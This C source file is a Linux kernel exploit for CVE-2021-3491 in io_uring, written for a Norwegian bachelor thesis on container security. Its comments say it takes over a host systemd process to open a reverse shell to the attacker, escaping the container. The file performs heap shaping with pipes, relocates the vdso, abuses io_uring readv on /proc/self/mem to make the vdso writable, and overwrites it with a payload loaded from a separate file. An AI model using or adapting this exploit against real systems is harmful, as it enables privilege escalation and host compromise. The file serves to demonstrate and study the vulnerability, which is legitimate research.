/* SPDX-License-Identifier: MIT */
/*
 * Programmet var i utgangspunktet basert på Jens Axboe sine eksempler for bruk av io_uring systemet
 *  https://github.com/axboe/liburing. Denne filen spesifikt var basert på 
 *  https://github.com/axboe/liburing/blob/master/examples/io_uring-test.c før den ble kraftig modifisert.
 */
/*
 * Et program som utnytter CVE-2021-3491 til å ta kontroll over en systemd prosessen på vertssystemet
 *  og dermed få den prosessen til å åpne et reverse shell tilbake til angriper.
 * 
 * Utviklet til bacheloroppgaven "Virtuelle containere og sikkerhetsutfordringene rundt dem" gjennomført
 *  ved Cyberingeniørskolen i 2022 for å demonstrere hvordan en sårbarhet kan føre til en container escape.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE 
#endif

#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/auxv.h>
#include <unistd.h>
#include "liburing.h"
#include "io_uring_debug.h"
#include <signal.h>

#define NBYTES 0x80000000
#define NR_BUFS 2
#define BGID 0x1EE7
#define PAGE_ALIGN_ATTEMPTS 8
#define OVERWRITE_SIZE 1
#define PAGEIT 401
#define PAYLOAD_POS		0x1000
#define PAYLOAD_SIZE	0x1c5

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS 0x10
#endif

#ifndef O_DIRECT
#define O_DIRECT 00040000 /* direct disk access hint */
#endif

#define PAGE_SIZE		0x1000

#define PMD_SHIFT       21
#define PMD_SIZE        (1ul << PMD_SHIFT)
#define PMD_MASK        (~(PMD_SIZE-1))

void *mem, *memtmp;
void *page1, *page2, *page3;
void *vdso_addr;
int pipefds[PAGEIT][2];

int page_shaping()
{
// objs_per_slab * (1+cpu_partial)
// Målet er å allokere riktig mengde objekter sånn at når vi flytter vdso
// realloc så vil den havne på starten av en ny page table. Denne page
// tablen skal ligge rett etter en page hvor vi lett kan plassere pagen
// som brukes av mem_rw.
	void *vdso_new_addr, *retpoint;
	
	//-----------------------------------------
	// Buffer for pipes å skrive fra
	//-----------------------------------------
	memtmp = mmap(NULL, PAGE_SIZE*2, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	
	//-----------------------------------------
	// Tømmer freelist i cpu cachen
	//-----------------------------------------

	for(unsigned long n = 0; n < PAGEIT;n++){
		if (pipe(pipefds[n]) == -1){
			perror("[-] pipe");
			return -1;
		};
		memset(memtmp,n,PAGE_SIZE);
		write(pipefds[n][1],memtmp,PAGE_SIZE);
	}
	printf("[+] Emptied the freelist\n");

	for(unsigned long n = 0; n < PAGEIT;n++){
		read(pipefds[n][0],memtmp,PAGE_SIZE);
	}
	//-----------------------------------------
	// Reallokerer vdso til en ny adresse
	//-----------------------------------------

	printf("[+] vdso located @ 0x%lx\n",(unsigned long)vdso_addr);
	
	memcpy(memtmp,vdso_addr,PAGE_SIZE*2);

	vdso_new_addr = (void *)(((unsigned long)vdso_addr + (unsigned long)PMD_SIZE*2) & (unsigned long)PMD_MASK);
	
	//printf("[DEBUG] vdso_new_addr = 0x%lx\n",(unsigned long)vdso_new_addr);
	//printf("[DEBUG] vdso_new_addr PMD base\t=\t0x%lx\n\tvdso_addr PMD base\t=\t0x%lx\n",((unsigned long)vdso_new_addr & PMD_MASK), ((unsigned long)vdso_addr & PMD_MASK));
	
	retpoint = mremap(vdso_addr,PAGE_SIZE*2,PAGE_SIZE*2,MREMAP_MAYMOVE | MREMAP_FIXED,vdso_new_addr);
	if (retpoint < (void *)0) {
		perror("[-] mremap");
		return -1;
	} else if (retpoint != vdso_new_addr) {
		printf("[-] failed to relocate page to start of next pagetable.\n");
		return -1;
	}
	memcpy(memtmp,vdso_new_addr,PAGE_SIZE*2);


	printf("[+] vdso reallocated to 0x%lx\n",(unsigned long)vdso_new_addr);
	
	vdso_addr = vdso_new_addr;
	return 0;

}

int setup_io_uring_buffer(void *buf, struct io_uring ring)
{
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	int ret;

	sqe = io_uring_get_sqe(&ring);
	if (!sqe)
	{
		perror("sqe");
		return 1;
	}

	io_uring_prep_provide_buffers(sqe, buf, NBYTES, NR_BUFS, BGID, BGID + 1);
	sqe->flags = 0;

	//printf("\n[DEBUG]After io_uring_prep_provide_buffers\n");
	// io_uring_print_struct(sqe,STRUCT_URING_SQE);

	ret = io_uring_submit(&ring);
	if (ret < 0)
	{
		fprintf(stderr, "io_uring_submit: %s\n", strerror(-ret));
		return 1;
	}
	else if (ret != 1)
	{
		fprintf(stderr, "io_uring_submit submitted less %d\n", ret);
		return 1;
	}

	ret = io_uring_wait_cqe(&ring, &cqe);
	if (ret < 0)
	{
		fprintf(stderr, "io_uring_wait_cqe: %s\n", strerror(-ret));
		return 1;
	}

	io_uring_cqe_seen(&ring, cqe);
	// io_uring_print_struct(cqe,STRUCT_URING_CQE);
	return 0;
}

int read_io_uring(void *buf, struct io_uring ring, int fd, struct stat sb)
{
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	struct iovec *_iovec;
	int ret, loopit;

	_iovec = malloc(sizeof(_iovec));

	sqe = io_uring_get_sqe(&ring);
	if (!sqe)
	{
		perror("sqe");
		return 1;
	}

	//-----------------------------------------
	// Henter ut 3 pages etter hverandre
	//-----------------------------------------
	loopit = 0;
	do
	{
		int alligned;

		page3 = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		page2 = mmap(page3 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		page1 = mmap(page2 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		alligned = ((page2 == (page1 + PAGE_SIZE)) && (page3 == (page2 + PAGE_SIZE)));
		if (!alligned)
		{
			loopit += 1;

			if (loopit > PAGE_ALIGN_ATTEMPTS)
				printf("[-] Failed to allign userspace pages\n");
			perror("mmap");
			return -1;
		}
		else
		{
			printf("[+] Userspace pages alligned\n");
			break;
		}
	} while (1);

	//----------------------------------------------------------------
	// Fyller de 3 pagene med 0xff
	//----------------------------------------------------------------

	memset(page1, 0xff, PAGE_SIZE * 3);

	//----------------------------------------------------------------
	// Uallokerer en av pagene og lager en peker til riktig sted
	//----------------------------------------------------------------

	if (munmap(page3, PAGE_SIZE) != 0)
	{
		perror("munmap");
		return -1;
	};

	mem = page3 - PAGE_SIZE - OVERWRITE_SIZE;

	//printf("[DEBUG]\t3 pages allocated next to each other and mem pointer generated\n\tpage1\t=\t%p\n\tpage2\t=\t%p\n\tpage3\t=\t%p\n\tmem\t=\t%p", page1, page2, page3, mem);

	//----------------------------------------------------------------
	// Oppsett av iovec og kall til readv operasjonen i io_uring
	//----------------------------------------------------------------

	_iovec->iov_base = buf;
	_iovec->iov_len = NBYTES;
	io_uring_prep_readv(sqe, fd, _iovec, 1, (unsigned long long)mem);

	sqe->flags = IOSQE_BUFFER_SELECT & ~IOSQE_ASYNC;
	sqe->buf_group = BGID;

	//printf("\n[DEBUG]After io_uring_prep_readv\n");
	// io_uring_print_struct(sqe,STRUCT_URING_SQE);

	// Frigjør kjerne pagen som ligger nærmest den nye pagetablen
	// sånn at den kan gis ut til kjernen i neste operasjon.
	close(pipefds[PAGEIT-1][0]);
	close(pipefds[PAGEIT-1][1]);

	ret = io_uring_submit(&ring);
	if (ret < 0)
	{
		fprintf(stderr, "io_uring_submit: %s\n", strerror(-ret));
		return 1;
	}
	else if (ret != 1)
	{
		fprintf(stderr, "io_uring_submit submitted less %d\n", ret);
		return 1;
	}


	//----------------------------------------------------------------

	ret = io_uring_wait_cqe(&ring, &cqe);
	if (ret < 0)
	{
		fprintf(stderr, "io_uring_wait_cqe: %s\n", strerror(-ret));
		return 1;
	}

	printf("[+] attempted to apply write permissions to vdso\n");
	//printf("\n");
	// io_uring_print_struct(cqe,STRUCT_URING_CQE);

	io_uring_cqe_seen(&ring, cqe);

	return 0;
}

int exploit_io_uring(char *file)
{
	struct io_uring ring;
	int fd, ret;
	struct stat sb;
	char buf[PAGE_SIZE * 3];
	long long wr_ret;

	//--------------------------------------------------
	//	Logfører hva som ligger i bufferen ved allokering
	//--------------------------------------------------

	//printf("[DEBUG]\tbuf\t=\t%p\n", (void *)buf);

	fd = open("/tmp/io_uring-mod-before.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	wr_ret = (long long)write(fd, buf, PAGE_SIZE + OVERWRITE_SIZE);

	if (!(wr_ret))
	{
		perror("write");
	};
	close(fd);

	//--------------------------------------------------

	ret = io_uring_queue_init(1, &ring, 0);
	if (ret < 0)
	{
		fprintf(stderr, "queue_init: %s\n", strerror(-ret));
		return 1;
	}

	fd = open(file, O_RDWR);
	if (fd < 0)
	{
		perror("[-] open /proc/self/mem");
		return 1;
	}

	if (fstat(fd, &sb) < 0)
	{
		perror("fstat");
		return 1;
	}

	//--------------------------------------------------
	//	Oppsett av delt buffer
	//--------------------------------------------------

	setup_io_uring_buffer(buf, ring);

	//--------------------------------------------------
	//	Leser fra fildeskriptor til delt minne
	//--------------------------------------------------

	read_io_uring(buf, ring, fd, sb);

	close(fd);
	io_uring_queue_exit(&ring);
	fd = open("/tmp/io_uring-mod.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	// 
	wr_ret = (long long)write(fd, buf, PAGE_SIZE + OVERWRITE_SIZE);

	if (!(wr_ret))
	{
		perror("write");
	};
	close(fd);
	//printf("[DEBUG] wr_ret = %llX\n buf @ %p\n", wr_ret, buf);

	return 0;
}

int write_vdso(){
	void *buf, *retpt, *restbuf;
	int fd, ret;

	fd = open("/tmp/io_uring-mod-old.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	write(fd,vdso_addr,PAGE_SIZE*2);
	close(fd);

	buf = malloc(PAGE_SIZE);
	restbuf = malloc(PAGE_SIZE);

	fd = open("./payload", O_RDONLY);
	if (fd < 1){
		perror("[-] open ./payload");
		return -1;
	}
	ret = lseek(fd,PAYLOAD_POS,SEEK_SET);
	if (ret != PAYLOAD_POS) {
		printf("[-] lseek returned %d\n",ret);
		perror("lseek");
		return -1;
	}
	ret = read(fd,buf,PAYLOAD_SIZE);
	if (ret != PAYLOAD_SIZE) {
		printf("[-] read returned %d\n",ret);
		perror("read");
		return -1;
	}
	close(fd);

	fd = open("/tmp/io_uring-payload.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	write(fd,buf,PAYLOAD_SIZE);
	close(fd);

	printf("[+] write_vdso found vdso at 0x%lx\n",(unsigned long)vdso_addr);
	
	retpt = memcpy(restbuf,vdso_addr+0x990,PAYLOAD_SIZE);
	if (retpt != restbuf){
		perror("[-] memcpy backup");
		return -1;
	};
	printf("[+] took a backup of the original vdso\n");

	retpt = memcpy(vdso_addr+0x990,buf,PAYLOAD_SIZE);
	if (retpt != vdso_addr+0x990){
		perror("[-] memcpy overwrite");
		return -1;
	};
	printf("[+] vdso overwritten with payload\n");
	//printf("[DEBUG] memcpy returned: 0x%lx\n",(unsigned long)retpt);

	fd = open("/tmp/io_uring-mod-new.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	write(fd,vdso_addr,PAGE_SIZE*2);
	close(fd);

	sleep(5);

	retpt = memcpy(vdso_addr+0x990,restbuf,PAYLOAD_SIZE);
	printf("[+] vdso restored using backup\n");

	return 0;
}

int main()
{
	int _page_size, fd;

	vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);

	_page_size = (int)getauxval(AT_PAGESZ);
	if (_page_size != PAGE_SIZE){
		printf("[-] Page size is not 4096 bytes. Exiting...\n");
		return -1;
	}

	fd = open("/tmp/io_uring-mod-vdso.out", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
	write(fd,vdso_addr,4368);
	close(fd);

	sleep(0);
	page_shaping();
	exploit_io_uring("/proc/self/mem");
	write_vdso();
	return 0;
}
